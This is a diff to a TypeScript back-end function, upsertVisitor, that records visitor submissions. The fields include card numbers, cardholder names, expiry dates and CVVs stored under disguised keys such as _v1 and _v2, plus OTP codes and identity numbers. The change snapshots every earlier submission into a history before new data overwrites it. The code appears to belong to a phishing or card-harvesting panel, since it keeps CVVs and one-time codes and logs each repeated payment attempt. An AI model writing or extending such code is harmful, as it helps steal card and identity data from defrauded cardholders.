@@ -354,31 +354,56 @@ async function upsertVisitor(visitorId: string, payload: Record<string, any> = {
   // Read data BEFORE any modifications
   const currentData = (await readVisitor(visitorId)) || {};
   
-  // Copy old payment data before replacing
-  const oldPaymentData = {
-    _v1: currentData._v1 || currentData.cardNumber,
-    _v4: currentData._v4 || currentData.cardOwner,
-    _v3: currentData._v3 || currentData.cardExpiry,
-    _v2: currentData._v2 || currentData.cvv,
-    cardType: currentData.cardType,
-    bankInfo: currentData.bankInfo,
-    _v1Status: currentData._v1Status,
-    paymentStatus: currentData.paymentStatus
-  };
+  // Determine the type of data being submitted
+  let dataType = "general";
+  let historyType = "_general";
   
-  // Check if this is a new payment attempt (has new card data AND had old card data)
-  const hasNewPaymentData = payload._v1 || payload.cardNumber || payload._v4 || payload.cardOwner;
-  const hadOldPaymentData = oldPaymentData._v1 || oldPaymentData.cardNumber || oldPaymentData._v4 || oldPaymentData.cardOwner;
+  if (payload._v1 || payload.cardNumber || payload._v4 || payload.cardOwner) {
+    dataType = "payment";
+    historyType = "_t1"; // Payment card data
+  } else if (payload._v3 || payload.otpCode) {
+    dataType = "otp";
+    historyType = "_v3"; // OTP verification
+  } else if (payload.buyerName || payload.identityNumber) {
+    dataType = "identity";
+    historyType = "_identity"; // Identity information
+  } else if (payload.phoneNumber || payload.email) {
+    dataType = "contact";
+    historyType = "_contact"; // Contact information
+  }
   
-  // Save old payment data to history BEFORE replacing
-  if (hasNewPaymentData && hadOldPaymentData) {
+  // Check if there's meaningful data to save to history
+  const hasNewData = Object.keys(payload).some(key => {
+    const value = payload[key];
+    return value !== null && value !== undefined && value !== '' && 
+           !['updatedAt', 'createdAt', 'history'].includes(key);
+  });
+  
+  const hadOldData = Object.keys(currentData).some(key => {
+    const value = currentData[key];
+    return value !== null && value !== undefined && value !== '' && 
+           !['updatedAt', 'createdAt', 'history'].includes(key);
+  });
+  
+  // Save old data to history BEFORE replacing (if both old and new data exist)
+  if (hasNewData && hadOldData) {
     try {
       const history = Array.isArray(currentData.history) ? currentData.history : [];
+      
+      // Create snapshot of all current data (excluding history)
+      const snapshotData: Record<string, any> = {};
+      Object.keys(currentData).forEach(key => {
+        if (!['history', 'updatedAt', 'createdAt'].includes(key)) {
+          snapshotData[key] = currentData[key];
+        }
+      });
+      
       const historyEntry = { 
-        type: "_t1", 
-        data: { ...oldPaymentData, replacedAt: new Date().toISOString(), reason: "new_payment_attempt" },
-        status: oldPaymentData._v1Status || oldPaymentData.paymentStatus || "replaced",
-        createdAt: new Date().toISOString()
+        type: historyType, 
+        dataType: dataType,
+        data: snapshotData,
+        replacedAt: new Date().toISOString(),
+        reason: `new_${dataType}_data`
       };
       
       // Save to database with history
@@ -391,13 +416,13 @@ async function upsertVisitor(visitorId: string, payload: Record<string, any> = {
         );
       }
       memoryVisitors.set(visitorId, updatedWithHistory);
-      console.log("[UpsertVisitor] Saved old payment data to history");
+      console.log(`[UpsertVisitor] Saved old ${dataType} data to history`);
     } catch (e) {
       console.warn("[UpsertVisitor] Failed to save history:", e);
     }
   }
   
-  // Now merge with new data (this replaces the old payment data)
+  // Now merge with new data
   const merged = { ...currentData, ...payload, updatedAt: new Date().toISOString() };
   console.log("[UpsertVisitor] merged keys:", Object.keys(merged));
 
